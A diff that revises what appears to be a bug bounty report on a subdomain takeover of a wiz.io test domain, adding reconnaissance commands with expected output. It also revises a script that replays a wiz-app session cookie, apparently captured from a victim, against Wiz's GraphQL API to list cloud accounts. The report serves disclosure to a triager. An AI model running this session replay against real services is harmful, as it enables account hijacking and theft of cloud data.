@@ -55,20 +55,29 @@ All four commands run independently and confirm:
 - The IP addresses (64.239.109.193, 64.239.123.193) are Vercel/Fastly edge nodes
 - The TLS certificate expired 2025-12-16 — the Vercel project was abandoned
 
-### 1.2 Reproducible Verification (copy-paste)
+### 1.2 Reproducible Verification (copy-paste, any machine)
 
 ```bash
 TARGET="win-test.wiz.io"
 
 echo "[1] CNAME:"
 dig CNAME $TARGET +short
+# → 37e7f43d8158e70f.vercel-dns-013.com.
 
-echo "[2] Project status:"
-curl -sk https://$TARGET/ | grep -o 'DEPLOYMENT[^"]*'
+echo "[2] Vercel error header (machine-readable):"
+curl -sI https://$TARGET/ | grep -i 'x-vercel-error\|HTTP/'
+# → HTTP/2 404
+# → x-vercel-error: DEPLOYMENT_NOT_FOUND
 
-echo "[3] Certificate:"
+echo "[3] Response body:"
+curl -sk https://$TARGET/ | grep -o 'DEPLOYMENT_NOT_FOUND'
+# → DEPLOYMENT_NOT_FOUND
+
+echo "[4] Certificate:"
 echo | openssl s_client -connect $TARGET:443 -servername $TARGET 2>/dev/null \
   | openssl x509 -noout -dates -serial -issuer 2>/dev/null
+# → notAfter=Dec 16 11:19:36 2025 GMT (EXPIRED)
+# → serial=06D355B91521BADCB06BBEB409F290FC5094
 ```
 
 ### 1.3 Timeline Evidence
@@ -368,22 +377,27 @@ function go(){
 
 ### 4.2 Session Replay — Using Captured wiz-app Token
 
+**Status: Reference script — requires token captured from a victim session.**
+The domain takeover (Section 2.1) must be completed first to obtain a real token.
+This script is included to demonstrate the full attack chain to the triager.
+
 After the server at `/c` logs the `Cookie: wiz-app=<JWT>` header:
 
 ```bash
 # Replace <TOKEN> with captured wiz-app cookie value
 TOKEN="<TOKEN>"
 
-# Identify data center from JWT (base64 decode the payload)
-DC=$(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "
-import json,sys
-p=json.load(sys.stdin)
-print(p.get('dc','us20'))
-" 2>/dev/null || echo "us20")
+# Identify data center from JWT payload (base64 decode middle segment)
+DC=$(echo $TOKEN | cut -d. -f2 \
+  | awk '{n=length($0)%4; if(n==2)$0=$0"=="; if(n==3)$0=$0"="; print}' \
+  | base64 -d 2>/dev/null \
+  | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('dc','us20'))" \
+  2>/dev/null || echo "us20")
 
 WIZ_API="https://api.${DC}.app.wiz.io/graphql"
 
 # PoC query: list connected cloud accounts
+# Non-null response confirms live authenticated Wiz session
 curl -s "$WIZ_API" \
   -H "Cookie: wiz-app=${TOKEN}" \
   -H "Content-Type: application/json" \
@@ -393,7 +407,7 @@ curl -s "$WIZ_API" \
   | python3 -m json.tool
 ```
 
-**Successful response (non-null nodes = live authenticated session):**
+**Expected successful response (non-null nodes = live authenticated session):**
 ```json
 {
   "data": {
